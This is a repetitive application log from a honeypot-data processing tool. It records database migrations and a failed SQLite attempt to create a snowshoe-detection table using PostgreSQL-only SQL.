2025-10-18 18:32:40,065:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,065:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,065:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,065:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,065:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,065:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,065:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,065:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,065:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:40,067:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,067:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,067:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,067:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,067:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,067:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,067:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,067:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,067:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,067:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:40,072:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,072:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,072:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,072:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,072:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,072:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,072:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,072:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,072:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,072:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:40,074:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,074:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,074:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,074:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,074:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,074:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,074:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,074:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,074:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,074:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:40,076:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,076:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,076:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,076:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,076:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,076:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,076:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,076:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,076:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,076:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:40,078:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,078:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,078:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,078:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,078:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,078:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,078:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,078:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,078:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,078:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:40,082:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,082:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,082:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,082:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,082:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,082:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,082:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,082:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,082:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,082:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:40,084:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,084:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,084:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,084:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,084:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,084:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,084:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,084:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,084:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,084:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:40,086:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,086:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,086:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,086:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,086:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,086:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,086:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,086:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,086:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,086:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:40,088:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,088:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,088:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,088:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,088:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,088:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,088:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,088:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,088:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,088:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:40,089:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,089:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,089:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,089:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,089:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,089:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,089:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,089:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,089:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,089:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:40,092:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 18:32:40,092:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
